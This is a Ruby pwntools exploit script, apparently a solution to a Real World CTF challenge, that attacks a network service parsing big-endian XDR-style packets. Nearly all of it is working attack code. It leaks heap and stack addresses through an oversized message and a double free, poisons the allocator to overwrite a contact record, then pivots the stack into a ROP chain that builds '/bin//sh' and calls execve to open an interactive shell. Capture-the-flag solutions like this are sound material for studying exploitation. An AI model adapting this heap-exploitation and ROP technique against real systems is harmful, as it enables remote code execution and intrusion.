#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = 'tcp.realworldctf.com', 10917
@local = false
@p = './server'
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pad4(s)
  return s if s.size % 4 == 0
  s.ljust(s.size / 4 * 4 + 4, "\x00")
end

def create(name, ip)
  context.local(endian: :big) do
    pkt = [p32(1)]
    pkt << p32(1) # n
    name = pad4(name)
    fail if name.size > 4096
    pkt << [name.size.p32, pad4(name)]
    fail if ip.size >= 17
    pkt << [ip.size.p32, pad4(ip)]
    z.write(pkt.flatten.join)
  end
  z.gets 'success!'
end

def add_msg(cidx, content)
  context.local(endian: :big) do
    pkt = [p32(4), p32(cidx), p32(content.size), pad4(content)]
    z.write(pkt.flatten.join)
  end
  z.gets 'success!'
end

def add_hack_msg(cidx, sz)
  context.local(endian: :big) do
    pkt = [p32(4), p32(cidx), p32(sz)]
    z.write(pkt.flatten.join)
  end
  z.gets 'success!'
end

def del_msg(idx)
  context.local(endian: :big) do
    z.write(p32(6) + p32(idx))
  end
  z.gets 'success!'
end

def show_msg
  context.local(endian: :big) do
    z.write(p32(5))
  end
end

def show_contact
  context.local(endian: :big) { z.write(p32(2)) }
end


create("\x00", 'lalala')
add_msg(0, 'content')
add_msg(0, 'content')
# rop = "AAAAAAAA" * 50
ret = 0x4029c4
rop = flat(
  0x0000000000410df3, # pop rsi ; ret
  0x00000000006bc0e0, # @ .data
  0x000000000044a11c, # pop rax ; ret
  '/bin//sh',
  0x00000000004819d1, # mov qword ptr [rsi], rax ; ret
  0x0000000000410df3, # pop rsi ; ret
  0x00000000006bc0e8, # @ .data + 8
  0x00000000004454b0, # xor rax, rax ; ret
  0x00000000004819d1, # mov qword ptr [rsi], rax ; ret
  0x0000000000400686, # pop rdi ; ret
  0x00000000006bc0e0, # @ .data
  0x0000000000410df3, # pop rsi ; ret
  0x00000000006bc0e8, # @ .data + 8
  0x000000000044a175, # pop rdx ; ret
  0x00000000006bc0e8, # @ .data + 8
  0x000000000044a11c, # pop rax ; ret
  59,
  0x00000000004773c5, # syscall ; ret

  0x400cba
)
rop = rop.ljust(400, p64(ret))
add_msg(0, rop) # 2
del_msg(1)
del_msg(0)
add_hack_msg(0, 4097) # 0
show_msg
z.gets 'message : '
heap = z.readn(8).u64
log.dump heap.hex
del_msg(0) # double free
contact_at = heap - 0x80
add_msg(0, p32(contact_at)) # 0
add_msg(0, p64(0xdeadbeef)) # 1, dummy
add_msg(0, p64(0x55555555)) # 2, dummy
leak = 0x6bfc00
add_msg(0, flat(leak, 0)) # 3, hack contact

# debug!
show_contact
z.gets 'name : '
stack_at = (z.readn(6) + "\x00\x00").u64
log.dump stack_at.hex

del_msg(1)
add_hack_msg(0, 4097) # 1
del_msg(1)
add_msg(0, p64(stack_at - 0x1190))
add_msg(0, p32(0xfaceb00c)) # dummy
# pause
pop_rsp = 0x00000000004029c3
rop_at = heap + 0x20
add_msg(0, flat(pop_rsp, rop_at))

z.interact
# rwctf{Digging_Into_libxdr}
